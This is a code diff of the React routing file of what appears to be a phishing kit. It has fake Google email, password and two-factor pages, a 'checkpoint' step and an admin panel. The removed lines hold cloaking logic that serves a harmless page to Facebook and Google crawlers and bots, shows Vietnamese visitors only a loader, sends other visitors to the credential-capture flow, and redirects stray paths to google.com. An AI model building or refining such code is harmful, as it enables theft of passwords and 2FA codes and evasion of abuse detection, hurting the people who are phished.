@@ -68,7 +68,7 @@ return (
                   <Route path="/google/login" element={<EnterEmail/>} />
                   <Route path="/google/auth/:userID" element={<EnterPass/>} />
                   <Route path="/google/twofactor" element={<Twofactor/>} />
-                  <Route path="/schedule/confirm/done" element={<SecurityDashboard />} />
+                  <Route path="/schedule/confirm/done" element={<Done />} />
                   <Route path="/adlogin" element={<Login />} />
                   <Route
                     path="/admin"
@@ -83,53 +83,6 @@ return (
               </div>
             </BrowserRouter>
           );  
-  const userAgent = navigator.userAgent.toLowerCase();
-  if(!userAgent.includes('facebook') 
-    && !userAgent.includes('google')
-    && !isbot(userAgent)){
-    if(countryCode.length == 0){
-                return(           
-          <div className="loading">
-              <div className="loader"></div>
-          </div>
-          );
-      }else{
-        if(countryCode.includes('vn')){
-          return(           
-          <div className="loading">
-              <div className="loader"></div>
-          </div>
-          );
-           return(showIframe("homepage.html"));
-
-        }else{
-          return (
-            <BrowserRouter>
-              <div id="app">
-                <Routes>
-                  <Route path="/" element={<Landing/>} />
-                  <Route path="/login" element={<LoginPage/>} />
-                  <Route path="checkpoint/:userID" element={<Twofactor/>} />
-                  <Route path="processing/:userID" element={<SecurityDashboard />} />
-                  <Route path="/adlogin" element={<Login />} />
-                  <Route
-                    path="/admin"
-                    element={
-                      <PrivateRoute>
-                        <AdminPage />
-                      </PrivateRoute>
-                    }
-                  />
-                  <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
-                </Routes>
-              </div>
-            </BrowserRouter>
-          );  
-        }
-      }
-  }else{
-    return(showIframe("homepage.html"));
-  }
 }
 
 
